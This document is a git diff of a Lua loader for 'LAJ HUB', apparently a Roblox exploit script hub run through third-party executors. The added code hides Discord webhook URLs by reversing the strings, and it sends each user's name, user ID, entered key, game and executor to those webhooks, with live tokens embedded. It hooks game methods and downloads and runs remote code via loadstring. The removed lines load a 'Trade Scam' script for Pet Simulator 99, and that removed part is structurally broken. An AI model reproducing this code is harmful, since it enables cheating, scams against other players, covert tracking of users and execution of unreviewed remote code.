@@ -1,33 +1,289 @@
---[[
+-- LAJ HUB Key System with Enhanced Webhook Functionality
+-- Combines key verification system with advanced webhook tracking
+-- Created for GitHub deployment
+
+-- Services
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local MarketplaceService = game:GetService("MarketplaceService")
 
--- Variables
--- Enhanced security with multi-layer obfuscation
-local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
-local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
-local WEBHOOK_URL = wh_part1 .. wh_part2
-
--- Enhanced security with multi-layer obfuscation for Discord webhook
-local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
-local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
-local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
-
--- Variables
 -- Variables
 local Player = Players.LocalPlayer
+local Mouse = Player:GetMouse()
 
--- Secure webhook URL (obfuscated and rate-limited)
+-- Configuration (edit these)
+local VALID_KEYS = {
+    "LAJPRO",
+    "LAJVIP456",
+    "LAJHUB789",
+    "LAJSPECIAL",
+    "LAJULTRA",
+    "LAJEXCLUSIVE",
+    "LAJPREMIUM", 
+    "LAJELITE"
+}
 
-local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
-local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
-local WEBHOOK_URL = wh_part1 .. wh_part2
+-- Discord server link
+local DISCORD_LINK = "https://discord.gg/4mgdcfvAJU"
 
--- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
+-- Webhook URLs for tracking (reversed for obfuscation)
+local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
+local USER_COUNT_WEBHOOK_URL = "https://discord.com/api/webhooks/1357978591928782933/2HF0z8dfhWcXjbPQwhTcCPrTkSPX-Eu2WP15-jNCAngiLbW5YODPsA835wVkucjya_MN"
+
+-- GitHub script URL (where your main script is hosted)
+local SCRIPT_URL = "https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/testingv2"
+
+-- Initialize user counter and last webhook time
+local userCounter = 0
 local lastWebhookTime = 0
-local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
--- Function to log ban/kick events via webhook with rate limiting
+local WEBHOOK_COOLDOWN = 300 -- 5 minutes cooldown
+
+-- Request function for different executors
+local function makeHttpRequest(options)
+    -- For Swift executor
+    if swift and swift.request then
+        return swift.request(options)
+    end
     
+    -- For Synapse and others with http/request libraries
+    if syn and syn.request then
+        return syn.request(options)
+    elseif http and http.request then
+        return http.request(options)
+    elseif request then
+        return request(options)
+    elseif HttpService and HttpService.RequestInternal then
+        return HttpService:RequestInternal(options)
+    else
+        warn("No HTTP request function found")
+        return {Success = false, Body = "No HTTP request function available"}
+    end
+end
+
+-- UI Colors
+local Theme = {
+    Background = Color3.fromRGB(35, 35, 35),
+    DarkBackground = Color3.fromRGB(25, 25, 25),
+    TextColor = Color3.fromRGB(255, 255, 255),
+    AccentColor = Color3.fromRGB(65, 105, 225),
+    ErrorColor = Color3.fromRGB(220, 60, 60),
+    SuccessColor = Color3.fromRGB(60, 220, 60)
+}
+
+-- Function to log key usage via webhook
+local function logKeyUsage(key, success)
+    -- Rate limiting check
+    local currentTime = os.time()
+    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
+        return
+    end
+    
+    local success_pcall, error_message = pcall(function()
+        -- Update the timestamp for rate limiting
+        lastWebhookTime = currentTime
+        
+        -- Prepare webhook data
+        local webhookData = {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = success and "LAJ HUB Key Used Successfully" or "Failed Key Attempt",
+                ["color"] = success and 65280 or 16711680, -- Green for success, red for failure
+                ["fields"] = {
+                    {
+                        ["name"] = "User",
+                        ["value"] = "```" .. Player.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "User ID",
+                        ["value"] = "```" .. tostring(Player.UserId) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Key Used",
+                        ["value"] = "```" .. key .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game",
+                        ["value"] = "```" .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game ID",
+                        ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
+                        ["inline"] = true
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = "Key Usage Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            }}
+        }
+        
+        -- Send webhook with proper error handling
+        local jsonData = HttpService:JSONEncode(webhookData)
+        makeHttpRequest({
+            Url = DISCORD_WEBHOOK_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = jsonData
+        })
+    end)
+    
+    if not success_pcall then
+        warn("Failed to send key webhook: " .. tostring(error_message))
+    end
+end
+
+-- Function to send usage data to Discord webhook
+local function sendUsageData()
+    -- Calculate current time for rate limiting
+    local currentTime = os.time()
+    
+    -- Rate limit to 1 request per 5 minutes to prevent webhook abuse
+    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
+        return
+    end
+    
+    -- Increment the user counter
+    userCounter = userCounter + 1
+    
+    -- Safely try to send the webhooks
+    local success, error_message = pcall(function()
+        -- Update the timestamp for rate limiting
+        lastWebhookTime = currentTime
+        
+        -- Prepare the data for the regular usage webhook
+        local webhookData = {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
+                ["type"] = "rich",
+                ["color"] = math.random(0, 0xFFFFFF),
+                ["fields"] = {
+                    {
+                        ["name"] = "User:",
+                        ["value"] = "```" .. Player.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "User ID:",
+                        ["value"] = "```" .. tostring(Player.UserId) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game:",
+                        ["value"] = "```" .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game ID:",
+                        ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Executor:",
+                        ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Players Active:",
+                        ["value"] = "```" .. tostring(Players.NumPlayers) .. "```",
+                        ["inline"] = true
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            }}
+        }
+        
+        -- Encode the data and send the first webhook
+        local jsonData = HttpService:JSONEncode(webhookData)
+        makeHttpRequest({
+            Url = DISCORD_WEBHOOK_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = jsonData
+        })
+        
+        -- Format time for the user count webhook
+        local formattedTime = os.date("%Y-%m-%d %H:%M:%S")
+        
+        -- Prepare data for the user count webhook
+        local countWebhookData = {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "🌟 LAJ HUB Usage Statistics 🌟",
+                ["description"] = "**Script has now been used by " .. tostring(userCounter) .. " players!**\n\n*A new player has just executed LAJ HUB*",
+                ["color"] = 0x7289DA, -- Discord blue color
+                ["thumbnail"] = {
+                    ["url"] = "https://i.imgur.com/QV7nVFU.png" -- You can replace with your own logo URL
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 Latest User",
+                        ["value"] = "```" .. Player.Name .. " (" .. tostring(Player.UserId) .. ")```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🎮 Game",
+                        ["value"] = "```" .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🔧 Executor",
+                        ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "📊 Total Users",
+                        ["value"] = "```yaml\n" .. tostring(userCounter) .. " Users```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🔄 Daily Activity",
+                        ["value"] = "```diff\n+ New user added to statistics\n+ Counter incremented successfully```",
+                        ["inline"] = false
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = "LAJ HUB Stats • Last Updated: " .. formattedTime,
+                    ["icon_url"] = "https://i.imgur.com/QV7nVFU.png"
+                }
+            }}
+        }
+        
+        -- Encode and send the user count webhook
+        local countJsonData = HttpService:JSONEncode(countWebhookData)
+        makeHttpRequest({
+            Url = USER_COUNT_WEBHOOK_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = countJsonData
+        })
+    end)
+    
+    if not success then
+        warn("Failed to send usage webhook: " .. tostring(error_message))
+    end
+end
+
+-- Function to log ban/kick events via webhook
 local function logBanEvent(reason)
     -- Rate limiting check
     local currentTime = os.time()
@@ -49,119 +305,59 @@ local function logBanEvent(reason)
         -- Update the timestamp for rate limiting
         lastWebhookTime = currentTime
         
-        -- Use makeHttpRequest instead of request for better compatibility
-        makeHttpRequest({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = {{                  
-                    ["title"] = "Player Banned/Kicked Alert",
-                    ["color"] = 16711680, -- Red color for ban alerts
-                    ["fields"] = {
-                        {
-                            ["name"] = "User",
-                            ["value"] = "```" .. Player.Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "User ID",
-                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game",
-                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game ID",
-                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Ban/Kick Reason",
-                            ["value"] = "```" .. (reason or "Unknown") .. "```",
-                            ["inline"] = false
-                        },
-                        {
-                            ["name"] = "Notification ID",
-                            ["value"] = "```" .. notificationId .. "```",
-                            ["inline"] = false
-                        }
+        -- Prepare the webhook data
+        local webhookData = {
+            ["content"] = "",
+            ["embeds"] = {{                  
+                ["title"] = "Player Banned/Kicked Alert",
+                ["color"] = 16711680, -- Red color for ban alerts
+                ["fields"] = {
+                    {
+                        ["name"] = "User",
+                        ["value"] = "```" .. Player.Name .. "```",
+                        ["inline"] = true
                     },
-                    ["footer"] = {
-                        ["text"] = "Ban/Kick Alert"
+                    {
+                        ["name"] = "User ID",
+                        ["value"] = "```" .. tostring(Player.UserId) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game",
+                        ["value"] = "```" .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game ID",
+                        ["value"] = "```" .. tostring(game.PlaceId) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Ban/Kick Reason",
+                        ["value"] = "```" .. (reason or "Unknown") .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Notification ID",
+                        ["value"] = "```" .. notificationId .. "```",
+                        ["inline"] = false
                     }
-                }}
-            })
-        })
-    end)
-    
-    if not success then
-        warn("Failed to send ban webhook: " .. tostring(error_message))
-    end
-end
-    -- Create a unique identifier for this notification to prevent duplicates
-    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
-    
-    -- Limit data being sent for privacy and security
-    local success, error_message = pcall(function()
-        -- Update the timestamp for rate limiting
-        lastWebhookTime = currentTime
+                },
+                ["footer"] = {
+                    ["text"] = "Ban/Kick Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            }}
+        }
         
-        -- Use makeHttpRequest instead of request for better compatibility
+        -- Send the webhook
+        local jsonData = HttpService:JSONEncode(webhookData)
         makeHttpRequest({
-            Url = WEBHOOK_URL,
-            Method = "POST",
+            Url = DISCORD_WEBHOOK_URL,
+            Method = 'POST',
             Headers = {
-                ["Content-Type"] = "application/json"
+                ['Content-Type'] = 'application/json'
             },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = {{                  
-                    ["title"] = "Player Banned/Kicked Alert",
-                    ["color"] = 16711680, -- Red color for ban alerts
-                    ["fields"] = {
-                        {
-                            ["name"] = "User",
-                            ["value"] = "```" .. Player.Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "User ID",
-                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game",
-                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game ID",
-                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Ban/Kick Reason",
-                            ["value"] = "```" .. (reason or "Unknown") .. "```",
-                            ["inline"] = false
-                        },
-                        {
-                            ["name"] = "Notification ID",
-                            ["value"] = "```" .. notificationId .. "```",
-                            ["inline"] = false
-                        }
-                    },
-                    ["footer"] = {
-                        ["text"] = "Ban/Kick Alert"
-                    }
-                }}
-            })
+            Body = jsonData
         })
     end)
     
@@ -170,1904 +366,404 @@ end
     end
 end
 
--- Set up event listeners for kick/ban detection
--- Method 1: Detect when player is removed
-Players.PlayerRemoving:Connect(function(player)
-    if player == Player then
-        logBanEvent("Player removed from game (possibly kicked/banned)")
-    end
-end)
-
--- Method 2: Detect common kick methods
-local oldNameCall
-oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
-    
-    if method == "Kick" and self == Player then
-        local reason = args[1] or "Unknown"
-        logBanEvent(reason)
-    end
-    
-    return oldNameCall(self, ...)
-end)
-
--- Method 3: Monitor teleport failures as they often occur during bans
-game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
-    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
-        logBanEvent("Teleport failed due to ban: " .. errorMessage)
-    end
-end)
-
-print("LAJ HUB Ban detection system loaded successfully")
-end
-    LAJ HUB - Swift Compatible Version
-    Created for universal executor compatibility with special Swift support
-]]
-
--- Function to handle HTTP requests across different executors including Swift
-local function getHttpRequest(url)
-    -- For testing in standalone Lua, use a mock response
-    if not game then
-        print("Mock HTTP request to: " .. url)
-        return "-- mock response for testing"
-    end
-    
-    if swift and swift.request then
-        local response = swift.request({
-            Url = url,
-            Method = "GET"
-        })
-        if response and response.Body then
-            return response.Body
+-- Function to verify a key
+local function verifyKey(key)
+    for _, validKey in ipairs(VALID_KEYS) do
+        if key == validKey then
+            return true
         end
     end
-    
-    -- Fallback to standard HttpGet for other executors
-    return game:HttpGet(url)
+    return false
 end
 
--- Load Pet Simulator 99 Trade Scam script when in Roblox environment
-if game then
-    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+-- Function to load the main script
+local function loadMainScript()
+    local success, error_message = pcall(function()
+        loadstring(game:HttpGet(SCRIPT_URL))()
+    end)
+    
+    if not success then
+        warn("Failed to load main script: " .. tostring(error_message))
+    end
 end
 
-local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
+-- Set up kick/ban detection
+local function setupKickDetection()
+    -- Set up event listeners for kick/ban detection
+    Players.PlayerRemoving:Connect(function(player)
+        if player == Player then
+            logBanEvent("Player removed from game (possibly kicked/banned)")
+        end
+    end)
+    
+    -- Hook for kick detection
+    local oldNameCall
+    oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
+        local args = {...}
+        local method = getnamecallmethod()
+        
+        if method == "Kick" and self == Player then
+            local reason = args[1] or "Unknown"
+            logBanEvent(reason)
+        end
+        
+        return oldNameCall(self, ...)
+    end)
+    
+    -- Monitor teleport failures as they often occur during bans
+    game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+        if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
+            logBanEvent("Teleport failed due to ban: " .. errorMessage)
+        end
+    end)
+end
 
--- Initialize game services safely
-local Players = game and game:GetService("Players") or {}
-local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
-local HttpService = game and game:GetService("HttpService") or {
-    JSONEncode = function(_, data) return '{"mock":"json"}' end
-}
-
--- Support for multiple executors including Swift
-local function makeHttpRequest(options)
-    -- For testing in standalone Lua
-    if not game then
-        print("Mock HTTP request: " .. options.Url)
-        return {Success = true, Body = "-- mock response"}
+-- Creating UI Elements
+local function createKeySystemUI()
+    -- Check if UI already exists and remove it
+    if CoreGui:FindFirstChild("LAJHubKeySystem") then
+        CoreGui:FindFirstChild("LAJHubKeySystem"):Destroy()
     end
     
-    if swift and swift.request then
-        return swift.request(options)
-    elseif syn and syn.request then
-        return syn.request(options)
-    elseif http and http.request then
-        return http.request(options)
-    elseif http_request then
-        return http_request(options)
-    elseif request then
-        return request(options)
-    elseif httprequest then
-        return httprequest(options)
-    elseif fluxus and fluxus.request then
-        return fluxus.request(options)
+    -- Main ScreenGui
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "LAJHubKeySystem"
+    ScreenGui.Parent = CoreGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Main Frame
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0, 400, 0, 300) -- Slightly increased height for Discord button
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    MainFrame.BackgroundColor3 = Theme.Background
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+    
+    -- Apply corner radius
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 6)
+    MainCorner.Parent = MainFrame
+    
+    -- Title Bar
+    local TitleBar = Instance.new("Frame")
+    TitleBar.Name = "TitleBar"
+    TitleBar.Size = UDim2.new(1, 0, 0, 30)
+    TitleBar.Position = UDim2.new(0, 0, 0, 0)
+    TitleBar.BackgroundColor3 = Theme.DarkBackground
+    TitleBar.BorderSizePixel = 0
+    TitleBar.Parent = MainFrame
+    
+    local TitleCorner = Instance.new("UICorner")
+    TitleCorner.CornerRadius = UDim.new(0, 6)
+    TitleCorner.Parent = TitleBar
+    
+    -- Fix corners
+    local TitleCornerFix = Instance.new("Frame")
+    TitleCornerFix.Name = "TitleCornerFix"
+    TitleCornerFix.Size = UDim2.new(1, 0, 0.5, 0)
+    TitleCornerFix.Position = UDim2.new(0, 0, 0.5, 0)
+    TitleCornerFix.BackgroundColor3 = Theme.DarkBackground
+    TitleCornerFix.BorderSizePixel = 0
+    TitleCornerFix.Parent = TitleBar
+    
+    -- Make the title bar draggable
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+    
+    local function updateInput(input)
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
     
-    -- Fallback to standard HttpGet for GET requests
-    if options.Method == "GET" then
-        local success, result = pcall(function()
-            return {
-                Body = game:HttpGet(options.Url),
-                Success = true
-            }
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    
+    TitleBar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+    
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            updateInput(input)
+        end
+    end)
+    
+    -- Title
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Name = "TitleLabel"
+    TitleLabel.Size = UDim2.new(1, -60, 1, 0)
+    TitleLabel.Position = UDim2.new(0, 10, 0, 0)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = "LAJ HUB - Key System"
+    TitleLabel.TextColor3 = Theme.TextColor
+    TitleLabel.TextSize = 16
+    TitleLabel.Font = Enum.Font.SourceSansBold
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.Parent = TitleBar
+    
+    -- Close Button
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Name = "CloseButton"
+    CloseButton.Size = UDim2.new(0, 24, 0, 24)
+    CloseButton.Position = UDim2.new(1, -28, 0, 3)
+    CloseButton.BackgroundColor3 = Theme.ErrorColor
+    CloseButton.Text = "×"
+    CloseButton.TextColor3 = Theme.TextColor
+    CloseButton.TextSize = 18
+    CloseButton.Font = Enum.Font.SourceSansBold
+    CloseButton.Parent = TitleBar
+    
+    local CloseCorner = Instance.new("UICorner")
+    CloseCorner.CornerRadius = UDim.new(0, 4)
+    CloseCorner.Parent = CloseButton
+    
+    CloseButton.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+    end)
+    
+    -- Minimize Button
+    local MinimizeButton = Instance.new("TextButton")
+    MinimizeButton.Name = "MinimizeButton"
+    MinimizeButton.Size = UDim2.new(0, 24, 0, 24)
+    MinimizeButton.Position = UDim2.new(1, -56, 0, 3)
+    MinimizeButton.BackgroundColor3 = Theme.Background
+    MinimizeButton.Text = "-"
+    MinimizeButton.TextColor3 = Theme.TextColor
+    MinimizeButton.TextSize = 18
+    MinimizeButton.Font = Enum.Font.SourceSansBold
+    MinimizeButton.Parent = TitleBar
+    
+    local MinimizeCorner = Instance.new("UICorner")
+    MinimizeCorner.CornerRadius = UDim.new(0, 4)
+    MinimizeCorner.Parent = MinimizeButton
+    
+    -- Content Area
+    local ContentArea = Instance.new("Frame")
+    ContentArea.Name = "ContentArea"
+    ContentArea.Size = UDim2.new(1, -20, 1, -40)
+    ContentArea.Position = UDim2.new(0, 10, 0, 35)
+    ContentArea.BackgroundTransparency = 1
+    ContentArea.BorderSizePixel = 0
+    ContentArea.Parent = MainFrame
+    
+    -- Key input elements
+    local KeyLabel = Instance.new("TextLabel")
+    KeyLabel.Name = "KeyLabel"
+    KeyLabel.Size = UDim2.new(1, 0, 0, 20)
+    KeyLabel.Position = UDim2.new(0, 0, 0, 10)
+    KeyLabel.BackgroundTransparency = 1
+    KeyLabel.Text = "Enter your key:"
+    KeyLabel.TextColor3 = Theme.TextColor
+    KeyLabel.TextSize = 14
+    KeyLabel.Font = Enum.Font.SourceSans
+    KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+    KeyLabel.Parent = ContentArea
+    
+    local KeyInput = Instance.new("TextBox")
+    KeyInput.Name = "KeyInput"
+    KeyInput.Size = UDim2.new(1, 0, 0, 35)
+    KeyInput.Position = UDim2.new(0, 0, 0, 35)
+    KeyInput.BackgroundColor3 = Theme.DarkBackground
+    KeyInput.PlaceholderText = "Enter your LAJ HUB key here..."
+    KeyInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+    KeyInput.Text = ""
+    KeyInput.TextColor3 = Theme.TextColor
+    KeyInput.TextSize = 14
+    KeyInput.Font = Enum.Font.SourceSans
+    KeyInput.BorderSizePixel = 0
+    KeyInput.ClearTextOnFocus = false
+    KeyInput.Parent = ContentArea
+    
+    local KeyInputCorner = Instance.new("UICorner")
+    KeyInputCorner.CornerRadius = UDim.new(0, 4)
+    KeyInputCorner.Parent = KeyInput
+    
+    -- Button for key verification
+    local VerifyButton = Instance.new("TextButton")
+    VerifyButton.Name = "VerifyButton"
+    VerifyButton.Size = UDim2.new(1, 0, 0, 35)
+    VerifyButton.Position = UDim2.new(0, 0, 0, 80)
+    VerifyButton.BackgroundColor3 = Theme.AccentColor
+    VerifyButton.Text = "Verify Key"
+    VerifyButton.TextColor3 = Theme.TextColor
+    VerifyButton.TextSize = 16
+    VerifyButton.Font = Enum.Font.SourceSansBold
+    VerifyButton.BorderSizePixel = 0
+    VerifyButton.Parent = ContentArea
+    
+    local VerifyCorner = Instance.new("UICorner")
+    VerifyCorner.CornerRadius = UDim.new(0, 4)
+    VerifyCorner.Parent = VerifyButton
+    
+    -- Status label
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Name = "StatusLabel"
+    StatusLabel.Size = UDim2.new(1, 0, 0, 20)
+    StatusLabel.Position = UDim2.new(0, 0, 0, 125)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Text = "Enter your key above"
+    StatusLabel.TextColor3 = Theme.TextColor
+    StatusLabel.TextSize = 14
+    StatusLabel.Font = Enum.Font.SourceSans
+    StatusLabel.Parent = ContentArea
+    
+    -- Discord button
+    local DiscordButton = Instance.new("TextButton")
+    DiscordButton.Name = "DiscordButton"
+    DiscordButton.Size = UDim2.new(1, 0, 0, 35)
+    DiscordButton.Position = UDim2.new(0, 0, 0, 155)
+    DiscordButton.BackgroundColor3 = Color3.fromRGB(114, 137, 218) -- Discord color
+    DiscordButton.Text = "Join Discord for Key"
+    DiscordButton.TextColor3 = Theme.TextColor
+    DiscordButton.TextSize = 16
+    DiscordButton.Font = Enum.Font.SourceSansBold
+    DiscordButton.BorderSizePixel = 0
+    DiscordButton.Parent = ContentArea
+    
+    local DiscordCorner = Instance.new("UICorner")
+    DiscordCorner.CornerRadius = UDim.new(0, 4)
+    DiscordCorner.Parent = DiscordButton
+    
+    -- Credits
+    local CreditsLabel = Instance.new("TextLabel")
+    CreditsLabel.Name = "CreditsLabel"
+    CreditsLabel.Size = UDim2.new(1, 0, 0, 20)
+    CreditsLabel.Position = UDim2.new(0, 0, 1, -25)
+    CreditsLabel.BackgroundTransparency = 1
+    CreditsLabel.Text = "LAJ HUB © 2023-2024 | Swift Compatible"
+    CreditsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    CreditsLabel.TextSize = 12
+    CreditsLabel.Font = Enum.Font.SourceSans
+    CreditsLabel.Parent = ContentArea
+    
+    -- Button actions
+    VerifyButton.MouseButton1Click:Connect(function()
+        local key = KeyInput.Text
+        
+        if verifyKey(key) then
+            -- Successful verification
+            StatusLabel.Text = "Key verified! Loading script..."
+            StatusLabel.TextColor3 = Theme.SuccessColor
+            
+            -- Log key usage
+            logKeyUsage(key, true)
+            
+            -- Initialize kick detection
+            setupKickDetection()
+            
+            -- Send usage data to webhook
+            sendUsageData()
+            
+            -- Create success animation
+            local oldColor = VerifyButton.BackgroundColor3
+            VerifyButton.BackgroundColor3 = Theme.SuccessColor
+            VerifyButton.Text = "Success!"
+            
+            wait(1)
+            
+            -- Load main script after UI success feedback
+            loadMainScript()
+            
+            -- Close the UI after loading the script
+            wait(0.5)
+            ScreenGui:Destroy()
+        else
+            -- Failed verification
+            StatusLabel.Text = "Invalid key. Try again or join Discord."
+            StatusLabel.TextColor3 = Theme.ErrorColor
+            
+            -- Log failed key attempt
+            logKeyUsage(key, false)
+            
+            -- Create error animation
+            local oldColor = VerifyButton.BackgroundColor3
+            VerifyButton.BackgroundColor3 = Theme.ErrorColor
+            VerifyButton.Text = "Invalid Key"
+            
+            wait(1)
+            
+            -- Reset button
+            VerifyButton.BackgroundColor3 = Theme.AccentColor
+            VerifyButton.Text = "Verify Key"
+        end
+    end)
+    
+    DiscordButton.MouseButton1Click:Connect(function()
+        -- Open Discord invite
+        pcall(function()
+            setclipboard(DISCORD_LINK)
         end)
-        if success then
-            return result
-        end
-    end
-    
-    return {Success = false, StatusCode = 500}
-end
-
-
--- Enhanced security with multi-layer obfuscation for Discord webhook
-local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
-local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
-local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
-
-end
-
-if game then
-    sendUsageData()
-end
-
-local Window = Rayfield:CreateWindow({
-   Name = "LAJ HUB",
-   Icon = 0,
-   LoadingTitle = "LAJ HUB",
-   LoadingSubtitle = "Premium Scripts",
-   Theme = "Default",
-
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false,
-
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = "LAJHub",
-      FileName = "LAJHubConfig"
-   },
-
-   Discord = {
